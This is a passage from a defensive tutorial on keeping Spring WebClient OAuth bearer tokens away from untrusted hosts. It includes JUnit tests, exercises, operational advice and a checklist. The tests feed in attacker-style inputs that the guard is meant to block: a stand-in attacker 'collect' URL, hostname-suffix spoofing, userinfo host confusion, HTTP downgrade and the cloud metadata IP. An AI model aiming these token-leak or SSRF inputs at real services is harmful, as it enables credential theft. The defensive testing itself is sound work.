import org.springframework.web.reactive.function.client.ExchangeFunction;
import org.springframework.web.reactive.function.client.WebClient;

import reactor.core.publisher.Mono;
import reactor.test.StepVerifier;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.springframework.security.oauth2.client.web.reactive.function.client.ServerOAuth2AuthorizedClientExchangeFilterFunction.clientRegistrationId;

class OAuthClientBoundaryTests {

    private static final String BASE =
        "https://api.billing.example.invalid";

    private record Harness(
            WebClient webClient,
            AtomicInteger managerCalls,
            AtomicInteger transportCalls,
            AtomicReference<ClientRequest> observed) {
    }

    private Harness harness(HttpStatus status) {
        AtomicInteger managerCalls = new AtomicInteger();
        AtomicInteger transportCalls = new AtomicInteger();
        AtomicReference<ClientRequest> observed =
            new AtomicReference<>();

        ClientRegistration registration =
            ClientRegistration.withRegistrationId("billing-api")
                .clientId("test-client")
                .clientSecret("test-secret")
                .clientAuthenticationMethod(
                    ClientAuthenticationMethod.CLIENT_SECRET_BASIC)
                .authorizationGrantType(
                    AuthorizationGrantType.CLIENT_CREDENTIALS)
                .tokenUri(
                    "https://auth.billing.example.invalid/oauth/token")
                .build();

        var token = new OAuth2AccessToken(
            OAuth2AccessToken.TokenType.BEARER,
            "unit-test-token-only",
            Instant.now().minusSeconds(60),
            Instant.now().plusSeconds(3600));

        ReactiveOAuth2AuthorizedClientManager manager = request -> {
            managerCalls.incrementAndGet();
            return Mono.just(new OAuth2AuthorizedClient(
                registration, "service-test-principal", token));
        };

        var oauth2 =
            new ServerOAuth2AuthorizedClientExchangeFilterFunction(
                manager);
        oauth2.setDefaultOAuth2AuthorizedClient(false);

        ExchangeFunction transport = request -> {
            transportCalls.incrementAndGet();
            observed.set(request);

            ClientResponse.Builder builder =
                ClientResponse.create(status);
            if (status.is3xxRedirection()) {
                builder.header(HttpHeaders.LOCATION,
                    "https://attacker.example.invalid/collect");
            }
            return Mono.just(builder.body("ok").build());
        };

        WebClient web = WebClient.builder()
            .baseUrl(BASE)
            .filter(new DestinationGuard(URI.create(BASE)))
            .filter(oauth2)
            .filter(new RejectRedirectsFilter())
            .exchangeFunction(transport)
            .build();

        return new Harness(
            web, managerCalls, transportCalls, observed);
    }

    private Mono<String> get(
            Harness harness, String uri, boolean useOAuth) {
        WebClient.RequestHeadersSpec<?> spec =
            harness.webClient().get().uri(uri);

        if (useOAuth) {
            spec = spec.attributes(
                clientRegistrationId("billing-api"));
        }

        var principal =
            UsernamePasswordAuthenticationToken.authenticated(
                "service-test-principal",
                "unused",
                AuthorityUtils.createAuthorityList("ROLE_SERVICE"));

        return spec.retrieve().bodyToMono(String.class)
            .contextWrite(
                ReactiveSecurityContextHolder.withAuthentication(
                    principal));
    }

    @Test
    void trustedHostGetsBearerToken() {
        Harness h = harness(HttpStatus.OK);

        StepVerifier.create(get(h, "/v1/invoices/42", true))
            .expectNext("ok")
            .verifyComplete();

        assertEquals(1, h.managerCalls().get());
        assertEquals(1, h.transportCalls().get());
        assertEquals("Bearer unit-test-token-only",
            h.observed().get().headers()
                .getFirst(HttpHeaders.AUTHORIZATION));
        assertEquals("api.billing.example.invalid",
            h.observed().get().url().getHost());
    }

    @Test
    void missingRegistrationDoesNotAttachToken() {
        Harness h = harness(HttpStatus.OK);

        StepVerifier.create(get(h, "/v1/invoices", false))
            .expectNext("ok")
            .verifyComplete();

        assertEquals(0, h.managerCalls().get());
        assertEquals(1, h.transportCalls().get());
        assertNull(h.observed().get().headers()
            .getFirst(HttpHeaders.AUTHORIZATION));
    }

    private void assertBlocked(String uri) {
        Harness h = harness(HttpStatus.OK);

        StepVerifier.create(get(h, uri, true))
            .expectError(
                DestinationGuard.DestinationRejectedException.class)
            .verify();

        assertEquals(0, h.managerCalls().get());
        assertEquals(0, h.transportCalls().get());
    }

    @Test
    void blocksAttackerServerBeforeLookup() {
        assertBlocked("https://attacker.example.invalid/collect");
    }

    @Test
    void blocksHostnameSuffixSpoofing() {
        assertBlocked(
            "https://api.billing.example.invalid.attacker.invalid/x");
    }

    @Test
    void blocksHttpDowngrade() {
        assertBlocked("http://api.billing.example.invalid/x");
    }

    @Test
    void blocksPort8443() {
        assertBlocked("https://api.billing.example.invalid:8443/x");
    }

    @Test
    void blocksUserInfoHostConfusion() {
        assertBlocked(
            "https://api.billing.example.invalid@attacker.invalid/x");
    }

    @Test
    void blocksMetadataIp() {
        assertBlocked("https://169.254.169.254/latest/meta-data");
    }

    @Test
    void acceptsTrustedExplicitPort443() {
        Harness h = harness(HttpStatus.OK);

        StepVerifier.create(get(h,
                "https://api.billing.example.invalid:443/v1/invoices",
                true))
            .expectNext("ok")
            .verifyComplete();

        assertEquals(1, h.transportCalls().get());
        assertEquals("Bearer unit-test-token-only",
            h.observed().get().headers()
                .getFirst(HttpHeaders.AUTHORIZATION));
    }

    @Test
    void rejectsCrossOriginRedirect() {
        Harness h = harness(HttpStatus.FOUND);

        StepVerifier.create(get(h, "/v1/invoices", true))
            .expectError(IllegalStateException.class)
            .verify();

        assertEquals(1, h.transportCalls().get());
        assertEquals("api.billing.example.invalid",
            h.observed().get().url().getHost());
    }

    @Test
    void publicWebClientNeverGetsOAuthHeader() {
        AtomicReference<ClientRequest> captured =
            new AtomicReference<>();

        WebClient publicHttp = WebClient.builder()
            .exchangeFunction(request -> {
                captured.set(request);
                return Mono.just(
                    ClientResponse.create(HttpStatus.OK)
                        .body("public").build());
            })
            .build();

        StepVerifier.create(publicHttp.get()
                .uri("https://public.example.invalid/status")
                .retrieve()
                .bodyToMono(String.class))
            .expectNext("public")
            .verifyComplete();

        assertNull(captured.get().headers()
            .getFirst(HttpHeaders.AUTHORIZATION));
    }
}
```

This group has **11 test methods**:

1. Allowed relative URI with right registration -> manager called, Bearer present in mock outbound request.
2. Missing explicit registrationId -> no Bearer attached and manager not called.
3. Absolute URI to attacker host -> blocked before manager.
4. Host suffix spoof -> blocked.
5. HTTP downgrade -> blocked.
6. Port 8443 -> blocked.
7. Userinfo `trusted@attacker` -> blocked.
8. Metadata IP literal -> blocked.
9. HTTPS matching host/port 443 -> allowed.
10. HTTP 302 to another host -> errors and only one mock transport call.
11. Client without OAuth filter -> `Authorization` header absent.

**Test limitations:** Fake `ExchangeFunction` opens no real sockets; `transportCalls` counts do not prove firewalls, DNS, or Reactor Netty redirects in production deployments. `followRedirect(false)` in production configs still requires integration testing with a real test HTTP server, reverse proxy, and redirect chains.

### 9.1. Command to Run Tests

```bash
./gradlew test
```

PowerShell:

```powershell
.\gradlew.bat test
```

A total of **21 test methods** (10 + 11) are defined. The expected outcome is PASS on a matching Java 17+ / Boot 3.5 / Security 6.5 project. This is an **expectation based on source code**, not a confirmation that Gradle was run in the learner's environment.

In staging, additionally test:
- Real HTTP client with a fake Bearer token and mock Resource Server.
- 302/303/307/308 over the network stack, confirming no hop reaches a second host.
- TLS certificate/hostname validation, verifying `trustAll` is not used.
- Whether proxies or service meshes rewrite routing.
- DNS/IP egress policies and private/metadata endpoints.
- Resource Server rejecting wrong-`aud` tokens.
- Zero `Authorization` headers appearing in logs/APM/traces.

## 10. Operational Issues and Common Mistakes

### 10.1. 401/403 Is Not a Reason to Retry Another API with the Same Token

A Resource Server returning 401 may indicate an expired/invalid token; 403 may indicate insufficient scope/role/audience. Never "fall back" to another host using the same Bearer token to avoid errors.

Spring Security's filter provides `ReactiveOAuth2AuthorizationFailureHandler` depending on constructor/configuration:
- When constructed with `ReactiveOAuth2AuthorizedClientManager`, handling HTTP 401/403 from Resource Servers requires explicit configuration to remove invalid authorized clients when appropriate.
- The constructor taking `ReactiveClientRegistrationRepository` and `ServerOAuth2AuthorizedClientRepository` has different behavior documented in Javadoc.
- Choose refresh/reauthorization policies per grant; never retry infinitely or overwrite tokens carelessly.
- For background `client_credentials`, use the context-appropriate service manager.
- Never log authorization server token bodies on errors.

### 10.2. Log Redaction

Fields safe to log:
- Route template / operation name.
- Normalized allowlisted target hostname.
- Non-sensitive `registrationId`.
- Guard result (allowed/rejected), HTTP status, latency.
- Correlation ID, error category.

Never log:
- Access tokens, refresh tokens, client secrets.
- `Authorization`/`Cookie`/`Set-Cookie`.
- Raw URLs with token/PII query strings.
- Token endpoint response bodies or full JWTs.
- Request/response bodies containing personal data without redaction/retention controls.

### 10.3. Responding to a Leaked Token

If a Bearer token is discovered to have been sent to a third-party host:
1. Block the leaking outbound path immediately.
2. Record the host, timestamp, registration, and scope of the incident without pasting the token into tickets or chat.
3. Revoke or rotate tokens/credentials where applicable; self-contained JWTs may not be immediately revocable unless the Resource Server checks a revocation list.
4. Check logs, proxies, APM, and third-party stores that may have captured `Authorization`.
5. Audit actions the token could have performed while valid.
6. Tighten egress policies, token scopes/audiences/TTL, guards, and negative tests.
7. Execute incident response and notification per organizational procedures.

### 10.4. Symptom Reference Table

| Symptom | Possible Cause | Fix |
|---|---|---|
| Billing token appears in telemetry requests | Shared WebClient with default OAuth authorized client | Separate clients, remove defaults, explicit registration + guard |
| Absolute URL bypasses `baseUrl` | `baseUrl` only resolves relative URIs | Validate `ClientRequest.url()` before token filter |
| `contains` passes spoofed hostname | Raw string matching | Parse URI, exact `getHost()` |
| `trusted@attacker` misparsed | Userinfo masquerading as host | Reject userinfo, compare parsed host |
| Token sent over HTTP or port 8443 | Checked host only | Enforce HTTPS and port |
| Request goes to new host after 302 | Auto-redirect in transport/proxy | `followRedirect(false)`, reject 3xx, test on network |
| Guard rejects yet manager still called | Guard placed after OAuth2 filter | Place guard first and assert `managerCalls == 0` |
| Job `client_credentials` has no token | Used `ServerWebExchange`-dependent manager | Use service-oriented manager |
| Resource Server returns repeated 401/403 | Wrong token/audience/scope or missing failure handler | Check issuer/aud/scope/refresh; do not try other hosts |
| Token leaks into logs despite blocked network | Logger placed before guard or tracing headers | Add redaction, never log `Authorization` |
| DNS matches host yet IP is wrong | Rebinding, private IP routing | Resolver/egress ACLs and TLS validation |
| Same host serves different tenant APIs | Shared origin | Path/tenant policy, separate audiences |
| Mock tests pass yet production leaks | Mock does not execute transport redirects | Real network/proxy/Netty integration tests |
| Resource Server accepts wrong-`aud` token | Missing audience validation | Validate issuer/aud/expiry/scopes |
| Mutating WebClient drops guard | Caller alters filters | Expose typed gateway instead of raw `WebClient` |
| Token sent in URL query | Used query param or redirect | Use `Authorization` header to trusted origins only |

## 11. Exercises with Answers

### Exercise 1 — Using a Default OAuth Client

A WebClient enables `setDefaultOAuth2AuthorizedClient(true)` and is shared by both Billing and Weather APIs. What is the risk?

**Answer:** An OAuth2-logged-in user's access token can be attached to Weather API requests even though the token was only meant for Billing. Separate WebClients, avoid broad defaults, and enforce explicit registrations and host guards.

### Exercise 2 — Does baseUrl Lock the Host?

`baseUrl("https://api.billing.example.invalid")` is set, yet a service calls `uri("https://attacker.example.invalid")`.

**Answer:** It does not lock it down. An absolute URL overrides `baseUrl`. Validate the resolved URL in `ClientRequest` before the OAuth2 filter.

### Exercise 3 — Does setDefaultClientRegistrationId Create an Allowlist?

**Answer:** No. It selects a default OAuth client without validating the HTTP target. A billing registration token can still be sent to an unlisted host.

### Exercise 4 — Where Does contains Fail?

The URL `https://api.billing.example.invalid.attacker.invalid` contains the trusted hostname.

**Answer:** The actual parsed host is a subdomain of `attacker.invalid`; raw string checks are flawed. Use exact `URI.getHost()`, HTTPS, port checks, and reject userinfo.

### Exercise 5 — Right Host, Wrong Port

Is target `https://api.billing.example.invalid:8443/x` permitted by the demo guard?

**Answer:** No. The policy accepts only port 443 or default HTTPS. Another service on a different port on the same host has no automatic right to receive Billing tokens.

### Exercise 6 — Redirect to Another Host

The legitimate Resource Server host returns HTTP 302 to an attacker. Why not let the client follow automatically?

**Answer:** Some redirects occur below the WebClient filter, and header-forwarding behavior varies across connectors/configs; an initial request guard does not automatically inspect redirect hops. Disable auto-follow, re-validate every hop if redirecting is truly required, and never blindly relay Bearer headers.

### Exercise 7 — JWT with Wrong aud but Valid Signature

A token has `scope=invoice.read` and `aud=hr-api`. Should the Billing Resource Server accept it because the signature is valid?

**Answer:** No. Audience must be validated for Billing API alongside issuer/signature/expiry/scopes. Scopes do not substitute for audience.

### Exercise 8 — DNS Rebinding

The host matches the allowlist, yet DNS resolves to `169.254.169.254`. Does the Java URI guard catch it?

**Answer:** No, not if checking only the URI hostname. Network-layer egress/IP policies, trusted DNS resolvers, blocking metadata endpoints, and TLS hostname validation are required.

### Exercise 9 — Can Authorization Be Logged to Debug 401s?

**Answer:** No. Log normalized registrationId/status/error category/route/host, never raw tokens, headers, secrets, or sensitive queries.

### Exercise 10 — What Does Fake Transport Prove?

Mock `ExchangeFunction` shows `transportCalls=0` when blocked.

**Answer:** It proves the filter chain blocked the request before hitting the mock transport and manager in the unit test. It does not prove there are no redirects in real Reactor Netty/proxies or DNS rebinding; integration tests and egress controls are still needed.

### Exercise 11 — Why Can't a Background Job Find a User Token?

**Answer:** Jobs typically have no browser user's `ServerWebExchange` or `Authentication`. For `client_credentials`, use `AuthorizedClientServiceReactiveOAuth2AuthorizedClientManager` and a service principal. If user delegation is required, use a policy-approved delegation/token-exchange workflow.

### Exercise 12 — Shared Host with Multiple APIs

Hostname allowlisting passes, yet both HR and Billing services live on that host. Is that secure enough?

**Answer:** Not yet. Pin down paths, service identities, and tenants, and bind tokens with audience and scopes. Resource Servers must reject tokens meant for other services.

### Exercise 13 — URL Containing Userinfo

Which host does `https://api.billing.example.invalid@attacker.invalid/` target?

**Answer:** The host is `attacker.invalid`; everything left of `@` is userinfo. The guard parses the URI, checks `getHost()`, and rejects userinfo.

### Exercise 14 — Should One Token Be Used for Multiple APIs?

**Answer:** Only when the Authorization Server explicitly issues audiences/scopes for those resources and every API validates according to policy. Following least privilege, prefer separate narrowly scoped tokens per API rather than reusing tokens everywhere by default.

### Exercise 15 — After Discovering a Token Leak

**Answer:** Block the leak path, assess permissions and token lifetime, revoke/rotate as appropriate, investigate logs/traces and potential token abuse, tighten scopes/`aud`/TTL, add guards and egress controls, and report the incident per process.

## 12. Production Checklist

- [ ] Define trusted resource server origins in server-side configuration, never taking arbitrary URLs from users.
- [ ] Never use `setDefaultOAuth2AuthorizedClient(true)` on a shared `WebClient`.
- [ ] Never treat `setDefaultClientRegistrationId(...)` as a host allowlist.
- [ ] Select clients solely via explicit `clientRegistrationId(...)` at reviewed call sites.
- [ ] Ensure `DestinationGuard` runs **before** `ServerOAuth2AuthorizedClientExchangeFilterFunction`.
- [ ] Enforce HTTPS scheme, exact host, valid port, and reject userinfo/fragment/malformed URIs.
- [ ] Never treat `baseUrl` as a security boundary.
- [ ] Disable auto-following redirects; handle 3xx fail-closed per policy.
- [ ] Keep the Billing WebClient separate from public WebClients with no global `Authorization` header.
- [ ] Typed gateways accept only business IDs, never arbitrary destination URIs.
- [ ] Enforce path/tenant service-bound ACLs and proper token audiences on shared hosts.
- [ ] Have the Authorization Server issue minimal scopes/audiences; have the Resource Server validate issuer/aud/expiry/scopes.
- [ ] Keep TLS certificate chain and hostname verification enabled; never use trust-all SSL.
- [ ] Enforce DNS/IP egress policies blocking SSRF, rebinding, private, and metadata targets.
- [ ] Match API client/token manager to service vs. user flows with controlled refresh and 401/403 handling.
- [ ] Store client secrets in a secrets manager/env with rotation and access controls.
- [ ] Ensure logs, traces, APM, and proxies contain no Bearer tokens or query secrets.
- [ ] Maintain unit tests for trusted, untrusted, suffix, userinfo, downgrade, port, and `managerCalls == 0`.
- [ ] Run integration tests covering network redirects, proxies, TLS/DNS, and zero-token-to-wrong-host guarantees.
- [ ] Keep a runbook for revoking and rotating tokens during incidents.

## 13. Summary

```text
WRONG:
  Shared WebClient + default authorized client
  + arbitrary URI
  -> Bearer token can reach the wrong host

BETTER:
  BillingGateway.findInvoice(id)
  -> WebClient with trusted baseUrl
  -> DestinationGuard HTTPS exact host:443
  -> OAuth2 filter + explicit registrationId=billing-api
  -> RejectRedirectsFilter
  -> Reactor Netty followRedirect(false)
  -> Billing Resource Server (validates audience, scopes)

ADDITIONAL CONTROLS:
  DNS/IP/network egress controls + TLS verification
  RFC 8707 audience-bound tokens + least privilege
  Never log tokens, never put tokens in URLs
  Test both filters and real HTTP transport
```

**Conclusion:** `ServerOAuth2AuthorizedClientExchangeFilterFunction` acquires and attaches tokens, **but does not decide which servers are authorized to receive them**. Lock down destinations in the application before the OAuth2 filter, control redirects and egress at the transport layer, and require the Resource Server to verify audience and scopes. Neither `baseUrl` nor `registrationId` alone replaces those layers of control.

## Official Documentation

- [Spring Security 6.5 — Reactive OAuth2 Authorized Client Features](https://docs.spring.io/spring-security/reference/6.5/reactive/oauth2/client/authorized-clients.html)
- [Spring Security 6.5 — Reactive OAuth2 Client Core](https://docs.spring.io/spring-security/reference/6.5/reactive/oauth2/client/core.html)
- [Spring Security 6.5 — ServerOAuth2AuthorizedClientExchangeFilterFunction API](https://docs.spring.io/spring-security/reference/6.5/api/java/org/springframework/security/oauth2/client/web/reactive/function/client/ServerOAuth2AuthorizedClientExchangeFilterFunction.html)
- [Spring Security — AuthorizedClientServiceReactiveOAuth2AuthorizedClientManager](https://docs.spring.io/spring-security/reference/6.5/api/java/org/springframework/security/oauth2/client/AuthorizedClientServiceReactiveOAuth2AuthorizedClientManager.html)
- [Reactor Netty — HTTP Client redirects](https://projectreactor.io/docs/netty/release/reference/http-client.html)
- [OWASP — SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [RFC 6750 — Bearer Token Usage](https://www.rfc-editor.org/rfc/rfc6750)
- [RFC 8707 — Resource Indicators](https://www.rfc-editor.org/rfc/rfc8707)
- [RFC 9700 — OAuth 2.0 Security Best Current Practice](https://www.rfc-editor.org/rfc/rfc9700)
